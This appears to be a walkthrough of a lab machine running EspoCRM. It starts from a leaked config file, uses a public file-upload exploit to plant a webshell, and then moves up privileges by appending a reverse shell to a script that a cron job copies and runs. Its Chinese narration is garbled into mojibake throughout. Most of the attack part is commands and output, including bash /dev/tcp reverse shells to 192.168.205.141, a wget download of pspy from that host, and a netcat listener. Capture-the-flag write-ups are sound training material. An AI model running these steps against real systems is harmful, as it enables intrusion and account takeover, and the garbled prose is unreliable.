    0 =&gt; 'Meeting',
    1 =&gt; 'Call'
  ],
  'historyEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call',
    2 =&gt; 'Email'
  ],
  'busyRangesEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call'
  ],
  'emailAutoReplySuppressPeriod' =&gt; '2 hours',
  'emailAutoReplyLimit' =&gt; 5,
  'cleanupJobPeriod' =&gt; '1 month',
  'cleanupActionHistoryPeriod' =&gt; '15 days',
  'cleanupAuthTokenPeriod' =&gt; '1 month',
  'currencyFormat' =&gt; 2,
  'currencyDecimalPlaces' =&gt; 2,
  'aclAllowDeleteCreated' =&gt; false,
  'aclAllowDeleteCreatedThresholdPeriod' =&gt; '24 hours',
  'attachmentUploadMaxSize' =&gt; 256,
  'attachmentUploadChunkSize' =&gt; 4,
  'inlineAttachmentUploadMaxSize' =&gt; 20,
  'textFilterUseContainsForVarchar' =&gt; false,
  'tabColorsDisabled' =&gt; false,
  'massPrintPdfMaxCount' =&gt; 50,
  'emailKeepParentTeamsEntityList' =&gt; [
    0 =&gt; 'Case'
  ],
  'streamEmailWithContentEntityTypeList' =&gt; [
    0 =&gt; 'Case'
  ],
  'recordListMaxSizeLimit' =&gt; 200,
  'noteDeleteThresholdPeriod' =&gt; '1 month',
  'noteEditThresholdPeriod' =&gt; '7 days',
  'emailForceUseExternalClient' =&gt; false,
  'useWebSocket' =&gt; false,
  'auth2FAMethodList' =&gt; [
    0 =&gt; 'Totp'
  ],
  'personNameFormat' =&gt; 'firstLast',
  'newNotificationCountInTitle' =&gt; false,
  'pdfEngine' =&gt; 'Tcpdf',
  'smsProvider' =&gt; NULL,
  'defaultFileStorage' =&gt; 'EspoUploadDir',
  'ldapUserNameAttribute' =&gt; 'sAMAccountName',
  'ldapUserFirstNameAttribute' =&gt; 'givenName',
  'ldapUserLastNameAttribute' =&gt; 'sn',
  'ldapUserTitleAttribute' =&gt; 'title',
  'ldapUserEmailAddressAttribute' =&gt; 'mail',
  'ldapUserPhoneNumberAttribute' =&gt; 'telephoneNumber',
  'ldapUserObjectClass' =&gt; 'person',
  'ldapPortalUserLdapAuth' =&gt; false,
  'passwordGenerateLength' =&gt; 10,
  'massActionIdleCountThreshold' =&gt; 100,
  'exportIdleCountThreshold' =&gt; 1000,
  'cacheTimestamp' =&gt; 1701712486,
  'microtime' =&gt; 1701712486.097623,
  'siteUrl' =&gt; 'http://espo.hmv',
  'fullTextSearchMinLength' =&gt; 4,
  'appTimestamp' =&gt; 1701712486,
  'maintenanceMode' =&gt; NULL,
  'cronDisabled' =&gt; NULL
];
                                                    
```

Âú®dataÊñá‰ª∂Â§π‰∏≠ÂèëÁé∞‰∫ÜÈÖçÁΩÆÊñá‰ª∂ÔºåÂπ∂‰∏îÈÖçÁΩÆÊñá‰ª∂‰∏≠ÊúâË¥¶Âè∑ÂíåÂØÜÁ†ÅÔºåÊàë‰ª¨Â∞ùËØïÁôªÂΩï

ÊàêÂäüËøõÂÖ•`EspoCRM`,Êü•Áúã‰∏Ä‰∏ã‰ªñÁâàÊú¨‰ø°ÊÅØ

![image](https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22)

ÊêúÁ¥¢ËØ•ÁâàÊú¨ÊúâÊ≤°ÊúâÊºèÊ¥û„ÄÇÈÄöËøáÊêúÁ¥¢ÂèëÁé∞Â≠òÂú®[‰∏ä‰º†Êñá‰ª∂ÊºèÊ¥û](https://github.com/josemlwdf/CVE-2023-5965)ÔºåÊàë‰ª¨Âà©Áî®‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ git clone https://github.com/josemlwdf/CVE-2023-5965.git  
Ê≠£ÂÖãÈöÜÂà∞ 'CVE-2023-5965'...
remote: Enumerating objects: 37, done.
remote: Counting objects: 100% (37/37), done.
remote: Compressing objects: 100% (34/34), done.
remote: Total 37 (delta 14), reused 0 (delta 0), pack-reused 0 (from 0)
Êé•Êî∂ÂØπË±°‰∏≠: 100% (37/37), 12.33 KiB | 287.00 KiB/s, ÂÆåÊàê.
Â§ÑÁêÜ delta ‰∏≠: 100% (14/14), ÂÆåÊàê.
                                             
```

ÂèëÁé∞Á¨¨‰∏Ä‰∏™ÈÄöËøáÊõ¥Êñ∞Êó†ÊïàÔºåÂ∞ùËØïÁ¨¨‰∫å‰∏™‰∏ä‰º†Êèí‰ª∂ÔºåÊàêÂäü‰∏ä‰º†Âπ∂ÊúâÂèçÈ¶à

![image](https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201)

![image](https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1)

Âºπ‰∏Ä‰∏™ÂèçÂºπshellÂõûÊù•

```bash
# ÊâßË°åËØ≠Âè•
bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888                        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 35578
bash: cannot set terminal process group (509): Inappropriate ioctl for device
bash: no job control in this shell
www-data@espo:~/html/public$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

# 4.ÊèêÊùÉ

```bash
www-data@espo:~/html/public$ ls -la
total 36
drwxr-xr-x  5 www-data www-data 4096 Jan  8 06:52 .
drwxr-xr-x 12 www-data www-data 4096 Dec  4  2023 ..
drwxr-xr-x  3 www-data www-data 4096 Dec  4  2023 api
-rw-r--r--  1 www-data www-data 1689 Dec  4  2023 index.php
drwxr-xr-x  5 www-data www-data 4096 Dec  4  2023 install
-rw-r--r--  1 www-data www-data 1660 Dec  4  2023 oauth-callback.php
drwxr-xr-x  2 www-data www-data 4096 Dec  4  2023 portal
-rw-r--r--  1 www-data www-data   26 Dec  4  2023 robots.txt
-rw-r--r--  1 www-data www-data  302 Jan  8 06:52 webshell.php
www-data@espo:~/html/public$ cd ..
www-data@espo:~/html$ ls -la
total 136
drwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 .
drwxr-xr-x  4 root     root      4096 Dec  4  2023 ..
-rw-r--r--  1 www-data www-data  1153 Dec  4  2023 .htaccess
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 EspoCRM-7.2.4
-rw-r--r--  1 www-data www-data 35819 Dec  4  2023 LICENSE.txt
drwxr-xr-x  3 www-data www-data  4096 Dec  4  2023 application
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 bin
-rw-r--r--  1 www-data www-data  1498 Dec  4  2023 bootstrap.php
-rw-r--r--  1 www-data www-data  1543 Dec  4  2023 clear_cache.php
drwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 client
-rw-r--r--  1 www-data www-data  1536 Dec  4  2023 command.php
-rw-r--r--  1 www-data www-data  1531 Dec  4  2023 cron.php
drwxrwxr-x  3 www-data www-data  4096 Dec  4  2023 custom
-rw-r--r--  1 www-data www-data  1535 Dec  4  2023 daemon.php
drwxrwxr-x  7 www-data www-data  4096 Jan  8 06:52 data
-rw-r--r--  1 www-data www-data  2812 Dec  4  2023 extension.php
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 html
-rw-r--r--  1 www-data www-data  3170 Dec  4  2023 index.php
drwxr-xr-x  4 www-data www-data  4096 Dec  4  2023 install
-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 preload.php
drwxr-xr-x  5 www-data www-data  4096 Jan  8 06:52 public
-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 rebuild.php
-rw-r--r--  1 www-data www-data  3034 Dec  4  2023 upgrade.php
drwxr-xr-x 39 www-data www-data  4096 Dec  4  2023 vendor
-rw-r--r--  1 www-data www-data  2534 Dec  4  2023 web.config
-rw-r--r--  1 www-data www-data  1541 Dec  4  2023 websocket.php
www-data@espo:~/html$ cd /home/
www-data@espo:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 Jan 24  2024 .
drwxr-xr-x 18 root   root   4096 Dec  4  2023 ..
drwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 mandie
www-data@espo:/home$ cd mandie/
www-data@espo:/home/mandie$ ls -al
total 48
drwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 .
drwxr-xr-x  3 root   root   4096 Jan 24  2024 ..
lrwxrwxrwx  1 root   root      9 Jan 26  2024 .bash_history -&gt; /dev/null
-rw-r--r--  1 mandie mandie  220 Dec  4  2023 .bash_logout
-rw-r--r--  1 mandie mandie 3526 Dec  4  2023 .bashrc
drwxr-xr-x  3 mandie mandie 4096 Dec  4  2023 .local
drwxr-xr-x 12 mandie mandie 4096 Dec  4  2023 .oh-my-zsh
-rw-r--r--  1 mandie mandie  807 Dec  4  2023 .profile
-rw-r--r--  1 mandie mandie 3890 Dec  4  2023 .zshrc
-rwxr-xr--  1 mandie mandie  493 Dec  4  2023 copyPics
drwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 pictures
-rwx------  1 mandie mandie   33 Jan 24  2024 user.txt
drwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 videos
www-data@espo:/home/mandie$ cd copyPics 
bash: cd: copyPics: Not a directory
www-data@espo:/home/mandie$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS='/var/shared_medias'
PICTURES_DIR='$HOME/pictures'
VIDEOS_DIR='$HOME/videos'

/usr/bin/find '$SOURCE_MEDIAS' ! -executable -exec /usr/bin/cp {} '$HOME' 2&gt;/dev/null \;
mkdir -p '$PICTURES_DIR' '$VIDEOS_DIR'

declare -A directory_mappings
directory_mappings=( ['$PICTURES_DIR']='jpeg jpg' ['$VIDEOS_DIR']='mp4 avi' )

for dir in '${!directory_mappings[@]}'; do
    for ext in ${directory_mappings[$dir]}; do
        mv '$HOME'/*.$ext '$dir/' 2&gt;/dev/null
    done
done
www-data@espo:/home/mandie$ cd /tmp/
www-data@espo:/tmp$ wget 192.168.205.141/pspy
--2025-01-08 06:56:53--  http://192.168.205.141/pspy
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3518724 (3.4M) [application/octet-stream]
Saving to: 'pspy'

pspy                                                         0%[                                                                       pspy                                                       100%[========================================================================================================================================&gt;]   3.36M  --.-KB/s    in 0.02s   

2025-01-08 06:56:53 (172 MB/s) - 'pspy' saved [3518724/3518724]

www-data@espo:/tmp$ chmod +x pspy 
www-data@espo:/tmp$ ./pspy 
pspy - version: 1.2.1 - Commit SHA: kali


     ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà ‚ñì‚ñà‚ñà   ‚ñà‚ñà‚ñì
    ‚ñì‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà    ‚ñí ‚ñì‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà  ‚ñà‚ñà‚ñí
    ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí‚ñë ‚ñì‚ñà‚ñà‚ñÑ   ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí ‚ñí‚ñà‚ñà ‚ñà‚ñà‚ñë
    ‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí  ‚ñí   ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí ‚ñë ‚ñê‚ñà‚ñà‚ñì‚ñë
    ‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñë ‚ñë ‚ñà‚ñà‚ñí‚ñì‚ñë
    ‚ñí‚ñì‚ñí‚ñë ‚ñë  ‚ñë‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë‚ñí‚ñì‚ñí‚ñë ‚ñë  ‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñí 
    ‚ñë‚ñí ‚ñë     ‚ñë ‚ñë‚ñí  ‚ñë ‚ñë‚ñë‚ñí ‚ñë     ‚ñì‚ñà‚ñà ‚ñë‚ñí‚ñë 
    ‚ñë‚ñë       ‚ñë  ‚ñë  ‚ñë  ‚ñë‚ñë       ‚ñí ‚ñí ‚ñë‚ñë  
                   ‚ñë           ‚ñë ‚ñë   
                               ‚ñë ‚ñë   

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/01/08 06:57:08 CMD: UID=33    PID=2064   | ./pspy 
2025/01/08 06:57:08 CMD: UID=0     PID=2048   | /usr/bin/php -f cron.php 
2025/01/08 06:57:08 CMD: UID=0     PID=2047   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php &gt; /dev/null 2&gt;&amp;1 
2025/01/08 06:57:08 CMD: UID=0     PID=2044   | /usr/sbin/CRON -f 
2025/01/08 06:57:08 CMD: UID=33    PID=2015   | bash 
2025/01/08 06:57:08 CMD: UID=33    PID=2014   | sh -c bash 
2025/01/08 06:57:08 CMD: UID=33    PID=2013   | script /dev/null -c bash 
2025/01/08 06:57:08 CMD: UID=0     PID=2011   | 
2025/01/08 06:57:08 CMD: UID=33    PID=1990   | bash -i 
2025/01/08 06:57:08 CMD: UID=33    PID=1989   | bash -c bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1 
2025/01/08 06:57:08 CMD: UID=33    PID=1988   | sh -c bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1' 
2025/01/08 06:57:08 CMD: UID=0     PID=1935   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1873   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1808   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1595   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1273   | 
2025/01/08 06:57:08 CMD: UID=33    PID=1111   | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=109   PID=1042   | qmgr -l -t unix -u 
2025/01/08 06:57:08 CMD: UID=109   PID=1041   | pickup -l -t unix -u -c 
2025/01/08 06:57:08 CMD: UID=0     PID=1039   | /usr/lib/postfix/sbin/master -w 
2025/01/08 06:57:08 CMD: UID=108   PID=673    | /usr/sbin/mariadbd 
2025/01/08 06:57:08 CMD: UID=0     PID=629    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/01/08 06:57:08 CMD: UID=33    PID=609    | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=33    PID=608    | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=33    PID=544    | nginx: worker process                          
2025/01/08 06:57:08 CMD: UID=0     PID=540    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2025/01/08 06:57:08 CMD: UID=0     PID=531    | /sbin/agetty -o -p -- \u --noclear - linux 
2025/01/08 06:57:08 CMD: UID=0     PID=509    | php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)                     
2025/01/08 06:57:08 CMD: UID=0     PID=489    | /usr/sbin/ModemManager 
2025/01/08 06:57:08 CMD: UID=0     PID=461    | /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev 
2025/01/08 06:57:08 CMD: UID=0     PID=432    | 
2025/01/08 06:57:08 CMD: UID=0     PID=421    | /lib/systemd/systemd-logind 
2025/01/08 06:57:08 CMD: UID=996   PID=414    | /usr/lib/polkit-1/polkitd --no-debug 
2025/01/08 06:57:08 CMD: UID=100   PID=411    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                                                    
2025/01/08 06:57:08 CMD: UID=0     PID=410    | /usr/sbin/cron -f 
2025/01/08 06:57:08 CMD: UID=0     PID=389    | dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                 
2025/01/08 06:57:08 CMD: UID=0     PID=303    | 
2025/01/08 06:57:08 CMD: UID=997   PID=284    | /lib/systemd/systemd-timesyncd 
2025/01/08 06:57:08 CMD: UID=0     PID=242    | /lib/systemd/systemd-udevd 
2025/01/08 06:57:08 CMD: UID=0     PID=218    | /lib/systemd/systemd-journald 
2025/01/08 06:57:08 CMD: UID=0     PID=174    | 
2025/01/08 06:57:08 CMD: UID=0     PID=173    | 
2025/01/08 06:57:08 CMD: UID=0     PID=141    | 
2025/01/08 06:57:08 CMD: UID=0     PID=134    | 
2025/01/08 06:57:08 CMD: UID=0     PID=133    | 
2025/01/08 06:57:08 CMD: UID=0     PID=132    | 
2025/01/08 06:57:08 CMD: UID=0     PID=131    | 
2025/01/08 06:57:08 CMD: UID=0     PID=130    | 
2025/01/08 06:57:08 CMD: UID=0     PID=129    | 
2025/01/08 06:57:08 CMD: UID=0     PID=126    | 
2025/01/08 06:57:08 CMD: UID=0     PID=59     | 
2025/01/08 06:57:08 CMD: UID=0     PID=58     | 
2025/01/08 06:57:08 CMD: UID=0     PID=53     | 
2025/01/08 06:57:08 CMD: UID=0     PID=48     | 
2025/01/08 06:57:08 CMD: UID=0     PID=47     | 
2025/01/08 06:57:08 CMD: UID=0     PID=46     | 
2025/01/08 06:57:08 CMD: UID=0     PID=44     | 
2025/01/08 06:57:08 CMD: UID=0     PID=38     | 
2025/01/08 06:57:08 CMD: UID=0     PID=37     | 
2025/01/08 06:57:08 CMD: UID=0     PID=36     | 
2025/01/08 06:57:08 CMD: UID=0     PID=35     | 
2025/01/08 06:57:08 CMD: UID=0     PID=34     | 
2025/01/08 06:57:08 CMD: UID=0     PID=33     | 
2025/01/08 06:57:08 CMD: UID=0     PID=32     | 
2025/01/08 06:57:08 CMD: UID=0     PID=31     | 
2025/01/08 06:57:08 CMD: UID=0     PID=30     | 
2025/01/08 06:57:08 CMD: UID=0     PID=29     | 
2025/01/08 06:57:08 CMD: UID=0     PID=28     | 
2025/01/08 06:57:08 CMD: UID=0     PID=27     | 
2025/01/08 06:57:08 CMD: UID=0     PID=24     | 
2025/01/08 06:57:08 CMD: UID=0     PID=23     | 
2025/01/08 06:57:08 CMD: UID=0     PID=22     | 
2025/01/08 06:57:08 CMD: UID=0     PID=21     | 
2025/01/08 06:57:08 CMD: UID=0     PID=20     | 
2025/01/08 06:57:08 CMD: UID=0     PID=18     | 
2025/01/08 06:57:08 CMD: UID=0     PID=16     | 
2025/01/08 06:57:08 CMD: UID=0     PID=15     | 
2025/01/08 06:57:08 CMD: UID=0     PID=14     | 
2025/01/08 06:57:08 CMD: UID=0     PID=13     | 
2025/01/08 06:57:08 CMD: UID=0     PID=12     | 
2025/01/08 06:57:08 CMD: UID=0     PID=11     | 
2025/01/08 06:57:08 CMD: UID=0     PID=10     | 
2025/01/08 06:57:08 CMD: UID=0     PID=6      | 
2025/01/08 06:57:08 CMD: UID=0     PID=5      | 
2025/01/08 06:57:08 CMD: UID=0     PID=4      | 
2025/01/08 06:57:08 CMD: UID=0     PID=3      | 
2025/01/08 06:57:08 CMD: UID=0     PID=2      | 
2025/01/08 06:57:08 CMD: UID=0     PID=1      | /sbin/init 
2025/01/08 06:58:01 CMD: UID=0     PID=2072   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2071   | /usr/sbin/cron -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2073   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2075   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2077   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php &gt; /dev/null 2&gt;&amp;1 
2025/01/08 06:58:01 CMD: UID=1000  PID=2076   | /bin/sh -c /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2078   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2079   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2080   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2081   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2082   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2083   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2084   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2085   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2086   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2087   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2088   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2089   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2090   | /bin/bash /home/mandie/copyPics 
^CExiting program... (interrupt)

```

ÊúâÂÆöÊó∂‰ªªÂä°Áî®`UID1000`ÁöÑÁî®Êà∑ÊâßË°å`/home/mandie/copyPics`Ôºå`copyPics`ÁöÑÂÜÖÂÆπ

```bash
www-data@espo:/home/mandie$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS='/var/shared_medias'
PICTURES_DIR='$HOME/pictures'
VIDEOS_DIR='$HOME/videos'

/usr/bin/find '$SOURCE_MEDIAS' ! -executable -exec /usr/bin/cp {} '$HOME' 2&gt;/dev/null \;
mkdir -p '$PICTURES_DIR' '$VIDEOS_DIR'

declare -A directory_mappings
directory_mappings=( ['$PICTURES_DIR']='jpeg jpg' ['$VIDEOS_DIR']='mp4 avi' )

for dir in '${!directory_mappings[@]}'; do
    for ext in ${directory_mappings[$dir]}; do
        mv '$HOME'/*.$ext '$dir/' 2&gt;/dev/null
    done
done
```

ÂÆûÁé∞‰∫Ü‰ªé‰∏Ä‰∏™ÁõÆÂΩï `/var/shared_medias` ‰∏≠Á≠õÈÄâ‰∏çÂèØÊâßË°åÊñá‰ª∂ÔºåÂπ∂ÊääÊñá‰ª∂Â§çÂà∂Âà∞Áî®Êà∑ÁöÑÂÆ∂ÁõÆÂΩï‰∏ã„ÄÇÈÇ£Êàë‰ª¨ÂèØ‰ª•Â∞ùËØïÂú®`/var/shared_medias`‰∏≠ÂàõÂª∫‰∏Ä‰∏™`copyPics`Êñá‰ª∂ÔºåÂπ∂Âú®ÈáåÈù¢Âä†ÁÇπÊñô

```bash
www-data@espo:/tmp$ ls -la /var/shared_medias
total 7792
drwxrwxrwt  2 root root    4096 Jan 24  2024 .
drwxr-xr-x 13 root root    4096 Dec  7  2023 ..
-rw-r--r--  1 root root   61521 Dec  4  2023 bedroom.jpg
-rw-r--r--  1 root root  298808 Dec  4  2023 burger.jpeg
-rw-r--r--  1 root root  236712 Dec  4  2023 dad-baby.jpg
-rw-r--r--  1 root root   61324 Dec  4  2023 dorothy.jpeg
-rw-r--r--  1 root root  268188 Dec  4  2023 family.jpg
-rw-r--r--  1 root root  251902 Dec  4  2023 maldives.jpg
-rw-r--r--  1 root root 6779935 Dec  4  2023 sky.mp4
www-data@espo:/tmp$ cd /var/shared_medias
www-data@espo:/var/shared_medias$ cp /home/mandie/copyPics .
www-data@espo:/var/shared_medias$ nano copyPics 
www-data@espo:/var/shared_medias$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS='/var/shared_medias'
PICTURES_DIR='$HOME/pictures'
VIDEOS_DIR='$HOME/videos'

/usr/bin/find '$SOURCE_MEDIAS' ! -executable -exec /usr/bin/cp {} '$HOME' 2&gt;/dev/null \;
mkdir -p '$PICTURES_DIR' '$VIDEOS_DIR'

declare -A directory_mappings
directory_mappings=( ['$PICTURES_DIR']='jpeg jpg' ['$VIDEOS_DIR']='mp4 avi' )

for dir in '${!directory_mappings[@]}'; do
    for ext in ${directory_mappings[$dir]}; do
        mv '$HOME'/*.$ext '$dir/' 2&gt;/dev/null
    done
done


bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/9999 0&gt;&amp;1'
```

ËÆ©Â≠êÂºπÈ£û‰ºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 9999
listening on [any] 9999 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 43262
bash: cannot set terminal process group (2562): Inappropriate ioctl for device
bash: no job control in this shell
mandie@espo:~$ id
uid=1000(mandie) gid=1000(mandie) groups=1000(mandie),100(users)

```

Ëé∑Âæó‰∏Ä‰∏ãÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

Â∞ùËØïÊèêÊùÉ

```bash
mandie@espo:~$ sudo -l
sudo: unable to resolve host espo: Name or service not known
Matching Defaults entries for mandie on espo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mandie may run the following commands on espo:
    (ALL : ALL) NOPASSWD: /usr/bin/savelog
mandie@espo:~$ /usr/bin/savelog -h
Usage: savelog [-m mode] [-u user] [-g group] [-t] [-c cycle] [-p]
             [-j] [-C] [-d] [-l] [-r rolldir] [-n] [-q] file ...
        -m mode    - chmod log files to mode
        -u user    - chown log files to user
        -g group   - chgrp log files to group
        -c cycle   - save cycle versions of the logfile (default: 7)
        -r rolldir - use rolldir instead of . to roll files
        -C         - force cleanup of cycled logfiles
        -d         - use standard date for rolling
        -D         - override date format for -d
        -t         - touch file
        -l         - don't compress any log files (default: compress)
        -p         - preserve mode/user/group of original file
        -j         - use bzip2 instead of gzip
        -J         - use xz instead of gzip
        -1 .. -9   - compression strength or memory usage (default: 9, except for xz)
        -x script  - invoke script with rotated log file in $FILE
        -n         - do not rotate empty files
        -q         - suppress rotation message
        file       - log file names

# ÁøªËØë
Áî®Ê≥ïÔºö savelog [-m Ê®°Âºè] [-u Áî®Êà∑] [-g ÁªÑ] [-t] [-c Âæ™ÁéØ] [-p]
             [-j][-C][-d][-l][-r ÊªöÂä®ÁõÆÂΩï][-n][-q] Êñá‰ª∂ ...
        -m mode - chmod Êó•ÂøóÊñá‰ª∂Ê®°Âºè
        -u Áî®Êà∑ - Â∞ÜÊó•ÂøóÊñá‰ª∂‰∏ä‰º†Âà∞Áî®Êà∑
        -g group - Ë¶ÅÂàÜÁªÑÁöÑ chgrp Êó•ÂøóÊñá‰ª∂
        -c cycle - ‰øùÂ≠òÊó•ÂøóÊñá‰ª∂ÁöÑÂæ™ÁéØÁâàÊú¨ÔºàÈªòËÆ§ÂÄºÔºö7Ôºâ
        -r rolldir - ‰ΩøÁî® rolldir ËÄå‰∏çÊòØ .ÊªöÂä®Êñá‰ª∂
        -C - Âº∫Âà∂Ê∏ÖÁêÜÂæ™ÁéØÁöÑÊó•ÂøóÊñá‰ª∂
        -d - ‰ΩøÁî®Ê†áÂáÜÊó•ÊúüËøõË°åÊªöÂä®
        -D - Ë¶ÜÁõñ -d ÁöÑÊó•ÊúüÊ†ºÂºè
        -t - Ëß¶Êë∏Êñá‰ª∂
        -l - ‰∏çÂéãÁº©‰ªª‰ΩïÊó•ÂøóÊñá‰ª∂ÔºàÈªòËÆ§ÔºöcompressÔºâ
        -p - ‰øùÁïôÂéüÂßãÊñá‰ª∂ÁöÑÊ®°Âºè/Áî®Êà∑/ÁªÑ
        -j - ‰ΩøÁî® bzip2 ËÄå‰∏çÊòØ gzip
        -J - ‰ΩøÁî® xz ËÄå‰∏çÊòØ gzip
        -1 ..-9 - ÂéãÁº©Âº∫Â∫¶ÊàñÂÜÖÂ≠ò‰ΩøÁî®ÁéáÔºàÈªòËÆ§ÂÄºÔºö9Ôºåxz Èô§Â§ñÔºâ
        -x script - ‰ΩøÁî®$FILE‰∏≠ÊóãËΩ¨ÁöÑÊó•ÂøóÊñá‰ª∂Ë∞ÉÁî®ËÑöÊú¨
        -n - ‰∏çÊóãËΩ¨Á©∫Êñá‰ª∂
        -q - Á¶ÅÊ≠¢ÊóãËΩ¨Ê∂àÊÅØ
        file - Êó•ÂøóÊñá‰ª∂Âêç

```

